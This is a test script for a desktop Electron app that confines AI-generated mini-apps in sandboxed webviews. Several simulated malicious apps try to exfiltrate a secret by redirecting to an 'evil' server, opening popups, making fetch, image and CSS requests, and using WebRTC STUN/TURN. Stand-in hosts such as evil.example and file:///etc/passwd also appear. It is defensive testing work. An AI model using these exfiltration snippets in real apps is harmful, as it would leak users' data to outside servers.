// Tests for how the Mac app fences in the apps the bots make (desktop/app-frames.cjs): which addresses are an
// app's page, which requests its session lets out, how a <webview> for one is prepared (and one for anything
// else refused or left alone), and that its page can't go anywhere else. Then the same in Electron for real:
// the real page an app runs in (lib/made-app-page.ts, with the view route's own CSP) in a webview on the apps'
// session, as desktop/main.cjs installs it, whose code tries to get data out: by going to another address
// with it, by loading a page of its own that then talks to the window, by a data: page, a popup, a fetch, an
// image, and by WebRTC (a STUN request over UDP and a TURN connection over TCP to this Mac's own wifi
// address). None of it may arrive; the bridge to the window must still work; and the same WebRTC code on
// an ordinary session does arrive (so the test would see it).
// Usage: node scripts/test-app-frames.mjs   (SKIP_ELECTRON=1 for the plain node part only)
import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { createSocket } from "node:dgram";
import { mkdtempSync, readFileSync, rmSync } from "node:fs";
import { createServer as createHttp } from "node:http";
import { createRequire, registerHooks } from "node:module";
import { createServer as createTcp } from "node:net";
import { networkInterfaces, tmpdir } from "node:os";
import { join } from "node:path";
import { pathToFileURL } from "node:url";

const root = new URL("..", import.meta.url).pathname.replace(/\/$/, "");
const require = createRequire(import.meta.url);
const F = require(`${root}/desktop/app-frames.cjs`);
let passed = 0;
const test = async (name, fn) => {
  await fn();
  passed++;
  console.log(`ok - ${name}`);
};

/* ---------------- In plain node ---------------- */

const SERVER = "http://localhost:3210";
const VIEW = `${SERVER}/api/made-apps/app_0a1b2c/view?v=3`;

await test("an app's page is a view address on Bops' own server, and nothing else is", () => {
  assert.equal(F.appOfView(VIEW, SERVER), "app_0a1b2c");
  assert.equal(F.appOfView(`${SERVER}/api/made-apps/app_0a1b2c/view`, SERVER), "app_0a1b2c");
  for (const url of [
    "http://127.0.0.1:3210/api/made-apps/app_0a1b2c/view",
    "http://localhost:3211/api/made-apps/app_0a1b2c/view",
    "https://localhost:3210/api/made-apps/app_0a1b2c/view",
    "http://evil.example/api/made-apps/app_0a1b2c/view",
    "http://user:pw@localhost:3210/api/made-apps/app_0a1b2c/view",
    `${SERVER}/api/made-apps/app_0a1b2c/bridge`,
    `${SERVER}/api/made-apps/app_0a1b2c`,
    `${SERVER}/api/made-apps/app_0a1b2c/view/x`,
    `${SERVER}/api/made-apps/..%2Fpages/view`,
    `${SERVER}/api/pages/pg_1`,
    "not a url",
    "",
  ])
    assert.equal(F.appOfView(url, SERVER), null, url);
});

await test("the apps' session lets out only an app's page, and inline data", () => {
  assert.equal(F.allowedRequest(VIEW, SERVER), true);
  assert.equal(F.allowedRequest("data:image/png;base64,AAAA", SERVER), true);
  assert.equal(F.allowedRequest("blob:null/1234", SERVER), true);
  for (const url of ["https://evil.example/?d=1", `${SERVER}/api/made-apps/app_0a1b2c/bridge`, `${SERVER}/api/state`, "ws://localhost:3210/x", "file:///etc/passwd", "chrome://gpu"]) assert.equal(F.allowedRequest(url, SERVER), false, url);
});

await test("fencing the session: requests checked, every permission and device refused, downloads stopped, a proxy that goes nowhere", async () => {
  const s = { on: (ev, fn) => (s.events[ev] = fn), events: {} };
  s.webRequest = { onBeforeRequest: (fn) => (s.before = fn) };
  s.setPermissionRequestHandler = (fn) => (s.request = fn);
  s.setPermissionCheckHandler = (fn) => (s.check = fn);
  s.setDevicePermissionHandler = (fn) => (s.device = fn);
  s.setProxy = async (c) => (s.proxy = c);
  await F.fenceAppSession(s, SERVER);
  const cancel = (url) => new Promise((r) => s.before({ url }, (x) => r(x.cancel)));
  assert.equal(await cancel(VIEW), false);
  assert.equal(await cancel("https://evil.example/leak"), true);
  for (const p of ["media", "geolocation", "notifications", "clipboard-read", "fullscreen"]) assert.equal(await new Promise((r) => s.request(null, p, r)), false, p);
  assert.equal(s.check(null, "media"), false);
  assert.equal(s.device({}), false);
  let stopped = false;
  s.events["will-download"]({ preventDefault: () => (stopped = true) });
  assert.ok(stopped, "no downloads");
  assert.deepEqual(s.proxy, { mode: "fixed_servers", proxyRules: "http://127.0.0.1:9" });
});

await test("a webview for an app gets the apps' preload, sandboxed, isolated, no Node, no popups; one for anything else on that partition is refused; a web tab is left alone", () => {
  const opts = { server: SERVER, preload: "/app/desktop/app-frame-preload.cjs" };
  const prefs = { preload: "/evil.js", nodeIntegration: true, sandbox: false, contextIsolation: false, webviewTag: true };
  const params = { partition: F.PARTITION, src: VIEW, allowpopups: "true", preload: "file:///evil.js" };
  assert.equal(F.prepareAppWebview(prefs, params, opts), true);
  assert.equal(prefs.preload, opts.preload);
  for (const [k, v] of Object.entries({ sandbox: true, contextIsolation: true, nodeIntegration: false, nodeIntegrationInSubFrames: false, nodeIntegrationInWorker: false, webSecurity: true, webviewTag: false })) assert.equal(prefs[k], v, k);
  assert.ok(!("allowpopups" in params) && !("preload" in params));
  assert.equal(F.prepareAppWebview({}, { partition: F.PARTITION, src: "https://evil.example/" }, opts), false);
  assert.equal(F.prepareAppWebview({}, { partition: F.PARTITION, src: `${SERVER}/api/state` }, opts), false);
  const tab = { preload: "x" };
  assert.equal(F.prepareAppWebview(tab, { partition: "persist:bops-web", src: "https://example.com" }, opts), null);
  assert.deepEqual(tab, { preload: "x" }, "untouched");
});

await test("an app's page may load its own page again, never another address, nor another app's; no windows; UDP only through the proxy", () => {
  const on = {};
  let url = "";
  const c = { getURL: () => url, on: (ev, fn) => (on[ev] = fn), setWebRTCIPHandlingPolicy: (p) => (c.rtc = p), setWindowOpenHandler: (fn) => (c.open = fn) };
  F.guardAppContents(c, SERVER);
  assert.equal(c.rtc, "disable_non_proxied_udp");
  assert.deepEqual(c.open({ url: "https://evil.example" }), { action: "deny" });
  const stopped = (ev, to, style = "details") => {
    let no = false;
    const e = { url: style === "details" ? to : undefined, preventDefault: () => (no = true) };
    on[ev](e, to);
    return no;
  };
  // Before its first page: any app's page.
  assert.equal(stopped("will-navigate", VIEW), false);
  url = VIEW;
  for (const ev of ["will-navigate", "will-frame-navigate", "will-redirect"]) {
    assert.equal(stopped(ev, `${SERVER}/api/made-apps/app_0a1b2c/view?v=4`), false, `${ev}: its own page`);
    assert.equal(stopped(ev, "https://evil.example/?d=secret"), true, `${ev}: elsewhere`);
    assert.equal(stopped(ev, "https://evil.example/?d=secret", "args"), true, `${ev}: elsewhere (url as an argument)`);
    assert.equal(stopped(ev, "data:text/html,<b>hi</b>"), true, `${ev}: data:`);
    assert.equal(stopped(ev, "about:blank"), true, `${ev}: about:blank`);
    assert.equal(stopped(ev, `${SERVER}/api/made-apps/app_ffff/view?v=1`), true, `${ev}: another app's page`);
    assert.equal(stopped(ev, `${SERVER}/api/state`), true, `${ev}: Bops' API`);
  }
});

await test("main.cjs installs it before any window and leaves the apps' webviews to it", () => {
  const main = readFileSync(`${root}/desktop/main.cjs`, "utf8");
  const ready = main.indexOf("app.whenReady().then(");
  const install = main.indexOf("appFrames = installAppFrames({ app, session, server: URL, preload: path.join(__dirname, \"app-frame-preload.cjs\")");
  assert.ok(install > ready && install < main.indexOf("void createWindow();", ready), "installed when ready, before the window");
  assert.match(main, /if \(contents\.getType\(\) !== "webview"\) return;\n\s*\/\/ [^\n]*\n\s*if \(appFrames\?\.isApps\(contents\.session\)\) return;\n\s*fenceTabSession\(contents\.session\);/, "a tab's rules never go on the apps' session");
  const preload = readFileSync(`${root}/desktop/app-frame-preload.cjs`, "utf8");
  assert.match(preload, /contextBridge\.exposeInMainWorld\("bopsHost", \{\n\s*post: \(message\) => ipcRenderer\.sendToHost\("bops-app", message\),\n\s*listen: \(fn\) => void ipcRenderer\.on\("bops-app", \(_event, message\) => fn\(message\)\),\n\}\);/);
  const tsx = readFileSync(`${root}/components/app/made-apps.tsx`, "utf8");
  assert.match(tsx, /createElement\("webview", \{ ref: setView, src: `\$\{location\.origin\}\$\{path\}`, partition: "bops-apps",/, "the window puts apps on that partition");
  assert.equal(F.PARTITION, "bops-apps");
});

/* ---------------- In Electron ---------------- */

if (process.env.SKIP_ELECTRON) {
  console.log(`\n${passed} passed (Electron skipped)`);
  process.exit(0);
}

registerHooks({
  resolve(specifier, context, next) {
    if (specifier.startsWith("@/")) specifier = pathToFileURL(`${root}/${specifier.slice(2)}`).href;
    try {
      return next(specifier, context);
    } catch (e) {
      if (/^(\.{1,2}\/|\/|file:)/.test(specifier))
        for (const ext of [".ts", ".tsx"])
          try {
            return next(specifier + ext, context);
          } catch {}
      throw e;
    }
  },
});
const P = await import(`${root}/lib/made-app-page.ts`);
const runtimes = { react: readFileSync(`${root}/public/made-apps/react-19.2.8.js`, "utf8"), tailwind: readFileSync(`${root}/public/made-apps/tailwind-browser-4.3.3.js`, "utf8") };
const CSP = readFileSync(`${root}/app/api/made-apps/[appId]/view/route.ts`, "utf8").match(/"(sandbox allow-scripts;[^"]+)"/)[1];

// Someone else's server: every request it gets is data that got out.
const hits = [];
const evil = createHttp((req, res) => {
  hits.push(req.url);
  res.setHeader("Content-Type", "text/html");
  res.end(`<!doctype html><script>window.bopsHost && bopsHost.post({ bops: 1, id: 7, method: "data.get", args: { key: "secret" } });</script>`);
});
await new Promise((r) => evil.listen(0, "127.0.0.1", r));
const EVIL = `http://127.0.0.1:${evil.address().port}`;

// WebRTC's way out: this Mac's own wifi address (not loopback, which Chromium reaches without a proxy).
const lan = Object.values(networkInterfaces())
  .flat()
  .find((a) => a && a.family === "IPv4" && !a.internal && !a.address.startsWith("169.254."))?.address;
/** A STUN listener (UDP) and a TURN one (TCP) on that address, counting what reaches each. */
async function listener() {
  const got = { udp: 0, tcp: 0 };
  const udp = createSocket("udp4");
  udp.on("message", () => got.udp++);
  const tcp = createTcp((sock) => {
    got.tcp++;
    sock.destroy();
  });
  await new Promise((r) => udp.bind(0, lan, r));
  await new Promise((r) => tcp.listen(0, lan, r));
  got.code = `const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:${lan}:${udp.address().port}" }, { urls: "turn:${lan}:${tcp.address().port}?transport=tcp", username: "u", credential: "p" }] }); pc.createDataChannel("x"); pc.createOffer().then((o) => pc.setLocalDescription(o));`;
  got.close = () => (udp.close(), tcp.close());
  return got;
}
const rtc = lan ? await listener() : null;
const rtcOpen = lan ? await listener() : null;

const once = (body) => `import { useEffect } from "react";\nexport default function App() { useEffect(() => { ${body} }, []); return <p id="hi">hi</p>; }\n`;
const apps = {
  works: once(`bops.data.get("secret").then((v) => window.__bopsReport("got " + v));`),
  nav: once(`bops.data.get("secret").then((v) => { location.href = "${EVIL}/leak?d=" + v; });`),
  takeover: once(`location.href = "${EVIL}/evil";`),
  other: once(`location.href = "/api/made-apps/app_works/view?v=1";`),
  datanav: once(`location.href = "data:text/html,<img src='${EVIL}/data'>";`),
  popup: once(`window.open("${EVIL}/popup");`),
  reach: once(`fetch("${EVIL}/fetch").catch(() => {}); const i = new Image(); i.src = "${EVIL}/img"; document.body.style.backgroundImage = "url(${EVIL}/css)";`),
  ...(lan ? { rtc: once(rtc.code), rtcopen: once(rtcOpen.code) } : {}),
};
const served = [];
const PARENT = (name) => `<!doctype html><body><webview id="app" partition="${name === "rtcopen" ? "rtc-open" : F.PARTITION}" src="${BOPS}/api/made-apps/app_${name}/view?v=1" style="width:600px;height:400px"></webview><script>
window.calls = []; window.events = [];
const view = document.getElementById("app");
// The window's side, as AppFrame answers (components/app/made-apps.tsx): only what comes up on the apps' channel.
view.addEventListener("ipc-message", (e) => {
  if (e.channel !== "bops-app") return;
  const m = e.args[0];
  if (!m || m.bops !== 1) return;
  if (m.event) return void window.events.push(m.event + (m.message ? " " + m.message : ""));
  window.calls.push(m.method);
  view.send("bops-app", { bops: 1, id: m.id, result: m.method === "data.get" && m.args.key === "secret" ? "TOPSECRET" : null });
});
</script></body>`;
const bops = createHttp((req, res) => {
  const url = new URL(req.url, "http://x");
  served.push(url.pathname);
  if (url.pathname.startsWith("/parent/")) {
    res.setHeader("Content-Type", "text/html");
    return res.end(PARENT(url.pathname.slice(8)));
  }
  const m = /^\/api\/made-apps\/app_([a-z]+)\/view$/.exec(url.pathname);
  if (m && apps[m[1]]) {
    res.writeHead(200, { "Content-Type": "text/html; charset=utf-8", "Content-Security-Policy": CSP });
    return res.end(P.appPage("App", apps[m[1]], runtimes));
  }
  res.writeHead(404).end("Not found");
});
await new Promise((r) => bops.listen(0, "127.0.0.1", r));
const BOPS = `http://127.0.0.1:${bops.address().port}`;

const scratch = mkdtempSync(join(tmpdir(), "bops-test-app-frames-"));
const results = join(scratch, "results.json");
const env = { ...process.env, BOPS, CASES: Object.keys(apps).join(","), RESULTS: results, USER_DATA: join(scratch, "user-data") };
delete env.ELECTRON_RUN_AS_NODE;
let seen;
try {
  await new Promise((resolve, reject) => {
    const child = spawn(require("electron"), [`${root}/scripts/test-app-frames.electron.cjs`], { env, stdio: ["ignore", "ignore", process.env.DEBUG ? "inherit" : "ignore"] });
    const t = setTimeout(() => (child.kill("SIGKILL"), reject(new Error("Electron took too long"))), 90_000);
    child.on("exit", () => (clearTimeout(t), resolve()));
    child.on("error", reject);
  });
  seen = JSON.parse(readFileSync(results, "utf8"));
} finally {
  rmSync(scratch, { recursive: true, force: true });
  evil.close();
  bops.close();
  rtc?.close();
  rtcOpen?.close();
}

await test("in Electron: the app runs in its webview and its window.bops reaches the window", () => {
  assert.deepEqual(seen.works.calls, ["data.get"]);
  assert.ok(seen.works.events.includes("ready"), seen.works.events.join(", "));
  assert.ok(seen.works.events.includes("error got TOPSECRET"), "the answer came back down");
});

await test("in Electron: nothing gets out, by going elsewhere, a page of its own, a data: page, a popup, a fetch or an image", () => {
  assert.deepEqual(hits, [], `someone else's server got: ${hits.join(", ")}`);
  assert.deepEqual(seen.nav.calls, ["data.get"], "the app asked for the secret, and stayed");
  assert.deepEqual(seen.takeover.calls, [], "no page but the app's ever talked to the window");
  assert.equal(served.filter((p) => p === "/api/made-apps/app_works/view").length, 1, "nor another app's page (only its own case loaded it)");
  for (const name of ["datanav", "popup", "reach"]) assert.deepEqual(seen[name].calls, [], name);
});

if (lan)
  await test("in Electron: WebRTC reaches nothing from an app (no STUN over UDP, no TURN over TCP), though the same code does from an ordinary session", () => {
    assert.deepEqual([rtc.udp, rtc.tcp], [0, 0], "from the app");
    assert.ok(rtcOpen.udp + rtcOpen.tcp > 0, "from an ordinary session it gets out (so the test can see it)");
  });
else console.log("(no wifi address here: the WebRTC check is skipped)");

console.log(`\n${passed} passed`);
